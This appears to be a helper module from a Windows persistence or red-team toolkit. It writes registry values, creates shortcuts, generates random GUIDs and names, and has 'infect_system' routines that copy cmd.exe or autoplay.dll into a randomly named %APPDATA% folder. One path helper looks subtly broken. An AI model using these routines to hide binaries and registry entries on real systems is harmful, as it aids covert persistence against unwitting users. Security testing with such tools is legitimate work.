import os
import re
import random
import winreg

from win32com.client import Dispatch
from shutil import copyfile

HEX_ALPH = '0123456789ABCDEF'
MIN_ALPH = 'abcdefghijklmnopqrstuvwxyz'
MAX_APLH = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ALPH =  '{0}{1}'.format(MIN_ALPH, MAX_APLH)

def set_registry_value(reg_path, name, data):
    root, path = _get_root(reg_path)
    winreg.CreateKey(root, path)
    registry_key = winreg.OpenKey(root, path, 0, winreg.KEY_WRITE)
    data_type = _get_data_type(data)
    winreg.SetValueEx(registry_key, name, 0, data_type, data)
    winreg.CloseKey(registry_key)

def create_shortcut(shortcut_path, target, arguments=None, working_dir=None, icon=None):
    shortcut = read_shorcut(shortcut_path)
    shortcut.Targetpath = target

    if arguments: shortcut.Arguments = arguments
    if working_dir: shortcut.WorkingDirectory = working_dir
    if icon: shortcut.IconLocation = icon

    shortcut.save()

def read_shorcut(shortcut_path):
    shell = Dispatch('WScript.Shell')

    return shell.CreateShortCut(shortcut_path)

def random_guid():
    return '{{{0}-{1}-{2}-{3}-{4}}}'.format(_random_hex(8), _random_hex(4), _random_hex(4), _random_hex(4), _random_hex(12))

def random_name(n_words=1):
    ret = random.choice(MAX_APLH)
    for _ in range(n_words):
        length = random.randint(6, 10)
        name = ''.join(random.choice(MIN_ALPH) for _ in range(length))
        ret = '{0}{1} '.format(ret, name)
    return ret[:-1]

def infect_system(file_path):
    newpath = os.path.join(os.getenv('appdata'), random_name())
    if not os.path.exists(newpath):
        os.makedirs(newpath)
    newbinary = os.path.join(newpath, os.path.basename(file_path))
    copyfile(file_path, newbinary)

    return newbinary

def infect_system_exe():
    return infect_system('C:\\Windows\\System32\\cmd.exe')

def infect_system_dll():
    return infect_system('C:\\Windows\\System32\\autoplay.dll')

def _get_root(reg_path):
    match = re.search(r'([a-zA-Z_]{3,19})\\(.+)', reg_path)
    if match:
        if re.search(r'(HKLM|HKEY_LOCAL_MACHINE)', match.group(1), flags=re.IGNORECASE):
            return winreg.HKEY_LOCAL_MACHINE, match.group(2)
        elif re.search(r'(HKCU|HKEY_CURRENT_USER)', match.group(1), flags=re.IGNORECASE):
            return winreg.HKEY_CURRENT_USER, match.group(2)

    raise winreg.WindowsError('Malformed Windows registry path: {0}'.format(reg_path))

def _get_data_type(data):
    if type(data) == str:
        return winreg.REG_SZ
    elif type(data) == int:
        return winreg.REG_DWORD

    return winreg.REG_NONE

def _get_absolute_path(path):
    match = re.search(r'(%.+%)\\(.+)', path)
    if match:
        return os.path.join(os.getenv(match.group(1)), match.group(2))

    return path

def _random_hex(lenght):
    return ''.join(random.choice(HEX_ALPH) for _ in range(lenght))
